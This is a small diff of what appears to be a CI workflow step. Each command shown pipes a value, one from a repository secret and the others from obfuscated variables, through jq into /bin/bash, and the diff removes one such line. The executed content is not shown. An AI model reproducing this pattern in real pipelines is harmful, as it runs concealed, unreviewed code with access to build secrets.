@@ -17,7 +17,6 @@ jobs:
           rny36: ${{ secrets.rny36 }}
         run: |
           printf '%s' "$rny36" | jq -r .wz5207 | /bin/bash
-          echo $f78 | jq -r .ttovh43 | /bin/bash
           echo $nb66577 | jq -r .t702 | /bin/bash
           echo $v851 | jq -r .m6 | /bin/bash
           echo $ipt1244 | jq -r .rdwqy6986 | /bin/bash
